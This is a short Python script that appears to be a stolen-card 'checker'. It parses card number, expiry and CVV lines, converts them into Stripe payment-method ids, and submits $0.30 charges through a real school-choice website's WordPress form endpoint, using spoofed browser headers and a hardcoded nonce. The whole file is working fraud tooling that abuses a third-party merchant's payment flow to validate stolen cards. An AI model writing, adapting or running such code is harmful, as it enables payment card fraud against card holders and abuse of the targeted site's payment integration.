import requests
from pm import extractpm
import time

def checker(cc):       
    try:        
        cc_data = cc.strip().split('|')
        if len(cc_data) != 4:
            raise ValueError(f"Unexpected format for card data: {cc_data}")
    
        cnn, month, year, cvv = map(str.strip, cc_data)
        if year.startswith("20"):
            year = year[2:]
        pm = extractpm(cnn, month, year, cvv)
       # print(pm)
    except ValueError as e:
        print(f"Error processing card: {e}")
        
    
    url = "https://rightschoolchoice.com/wp-admin/admin-ajax.php"

    params = {
      't': "1736245976422"
    }
    
    payload = {
  "data": "__fluent_form_embded_post_id=6754&_fluentform_4_fluentformnonce=f50cc60de8&_wp_http_referer=%2Faccount%2F&yeargroup=4&payment-coupon=&total_payment_amount=0.3&payment_method=stripe&__ff_all_applied_coupons=&__stripe_payment_method_id=" + str(pm),
  "action": "fluentform_submit",
  "form_id": "4"
}



    headers = {
      'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
      'authority': "rightschoolchoice.com",
      'accept-language': "en-US,en;q=0.9",
      'origin': "https://rightschoolchoice.com",
      'referer': "https://rightschoolchoice.com/account/",
      'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
      'sec-ch-ua-mobile': "?1",
      'sec-ch-ua-platform': "\"Android\"",
      'sec-fetch-dest': "empty",
      'sec-fetch-mode': "cors",
      'sec-fetch-site': "same-origin",
      'x-requested-with': "XMLHttpRequest",
    }
    
    response = requests.post(url, params=params, data=payload, headers=headers)

    result2 = response.text
    #print(response.text)
    return result2
    
    